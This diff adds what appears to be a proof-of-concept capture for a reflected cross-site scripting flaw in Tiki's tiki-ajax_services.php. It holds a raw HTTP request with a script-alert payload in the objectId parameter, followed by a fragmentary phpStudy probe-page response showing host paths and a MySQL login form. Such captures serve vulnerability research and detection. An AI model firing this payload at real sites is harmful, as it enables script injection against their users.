@@ -1,0 +1,109 @@
+GET /pte/tiki-ajax_services.php?action=list&controller=comment&objectId=<script>alert(document.domain)</script>&type=wiki+page HTTP/1.1
+Host: 192.168.203.178
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+
+
+
+	  <td></td>
+	  <td>DESKTOP-0E6SVBJ</td>
+	  <td></td>
+	  <td>C:/phpstudy_pro/WWW</td>
+	</tr>
+  <tr>
+	  <td></td>
+	  <td>admin@example.com</td>
+		<td></td>
+		<td>C:/phpstudy_pro/WWW/index.php</td>
+	</tr>
+</table>
+
+
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr>
+    <th colspan="4">PHP</th>
+  </tr>
+  <tr>
+    <td colspan="4"><span class="w_small">
+Core&nbsp;&nbsp;bcmath&nbsp;&nbsp;calendar&nbsp;&nbsp;ctype&nbsp;&nbsp;date&nbsp;&nbsp;ereg&nbsp;&nbsp;filter&nbsp;&nbsp;ftp&nbsp;&nbsp;hash&nbsp;&nbsp;iconv&nbsp;&nbsp;json&nbsp;&nbsp;mcrypt&nbsp;&nbsp;SPL&nbsp;&nbsp;<br />odbc&nbsp;&nbsp;pcre&nbsp;&nbsp;Reflection&nbsp;&nbsp;session&nbsp;&nbsp;standard&nbsp;&nbsp;mysqlnd&nbsp;&nbsp;tokenizer&nbsp;&nbsp;zip&nbsp;&nbsp;zlib&nbsp;&nbsp;libxml&nbsp;&nbsp;dom&nbsp;&nbsp;PDO&nbsp;&nbsp;openssl&nbsp;&nbsp;<br />SimpleXML&nbsp;&nbsp;wddx&nbsp;&nbsp;xml&nbsp;&nbsp;xmlreader&nbsp;&nbsp;xmlwriter&nbsp;&nbsp;cgi-fcgi&nbsp;&nbsp;curl&nbsp;&nbsp;fileinfo&nbsp;&nbsp;gd&nbsp;&nbsp;mbstring&nbsp;&nbsp;mysql&nbsp;&nbsp;mysqli&nbsp;&nbsp;Phar&nbsp;&nbsp;<br />pdo_mysql&nbsp;&nbsp;pdo_sqlite&nbsp;&nbsp;mhash&nbsp;&nbsp;</span>
+    </td>
+  </tr>
+</table>
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+  <tr><th colspan="4">PHP</th></tr>
+  <tr>
+    <td width="32%">PHPphpinfo</td>
+    
+
+
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>DBA </td>
+    <td><font color="red"></font></td>
+    <td>DBM </td>
+    <td><font color="red"></font></td>
+  </tr>
+  <tr>
+    <td>FilePro </td>
+    <td><font color="red"></font></td>
+    <td>SyBase </td>
+    <td><font color="red"></font></td>
+  </tr> 
+</table>
+
+<form action="/index.php#bottom" method="post">
+<!--MySQL-->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+	<tr><th colspan="3">MySQL</th></tr>
+  <tr>
+    <td width="15%"></td>
+    <td width="60%">
+      <input type="text" name="host" value="localhost" size="10" />
+      <input type="text" name="port" value="3306" size="10" />
+      <input type="text" name="login" size="10" />
+      <input type="password" name="password" size="10" />
+    </td>
+    <td width="25%">
+      <input class="btn" type="submit" name="act" value="MySQL" />
+    </td>
+  </tr>
+</table>
+  <!---->
+<table width="100%" cellpadding="3" cellspacing="0" align="center">
+	<tr><th colspan="3"></th></tr>
+  <tr>
+    <td width="15%"></td>
+    <td width="60%">
+      
+      <input type="text" name="funName" size="50" />
+    </td>
+    <td width="25%">
+      <input class="btn" type="submit" name="act" al
+
+
+ign="right" value="" />
+    </td>
+  </tr>
+  </table>
+
+</form>
+
+<div id="footer">
+<p>phpStudyApache+Nginx+IIS+Lighttpd+PHP+MySQL+phpMyAdmin+SQL-Front+Zend LoaderPHPPHPPHPWINDOWS
+ <a href="http://www.phpstudy.net/" target="_blank">www.phpstudy.net</a></p>
+</div>
+
+</div>
+</body>
+</html>
+0
+
+
+
+
